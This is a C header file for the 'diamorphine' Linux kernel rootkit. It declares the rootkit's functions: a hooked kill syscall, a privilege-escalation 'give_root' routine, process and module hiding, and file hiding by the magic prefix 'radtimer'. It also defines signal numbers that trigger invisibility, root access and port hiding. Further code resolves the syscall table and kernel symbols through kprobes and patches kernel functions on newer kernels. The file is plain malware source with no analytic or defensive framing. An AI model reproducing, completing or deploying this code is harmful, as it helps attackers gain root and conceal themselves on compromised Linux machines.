#ifndef __DIAMORPHINE_H
#define __DIAMORPHINE_H

#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <net/sock.h>
#include <net/inet_sock.h>
#include <linux/seq_file.h>
#include <linux/netlink.h>
#include <uapi/linux/inet_diag.h>

unsigned long resolve_sym(char *symbol);
unsigned long *get_syscall_table_bf(void);
struct task_struct *find_task(pid_t pid);
int is_invisible(pid_t pid);
void give_root(void);
void module_show(void);
void module_hide(void);

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage long hacked_kill(const struct pt_regs *pt_regs);
#else
asmlinkage long hacked_kill(pid_t pid, int sig);
#endif

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

#define MAGIC_PREFIX "radtimer"
#define PF_INVISIBLE 0x01000000
#define MODULE_NAME "diamorphine"

enum {
    SIGINVIS = 31,
    SIGSUPER = 64,
    SIGMODINVIS = 63,
    SIGPORTHIDE = 30
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
#define DUMP_SIZE 0x5000
void flipswitch_func(void *target_func, void *hacked_func);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

#endif
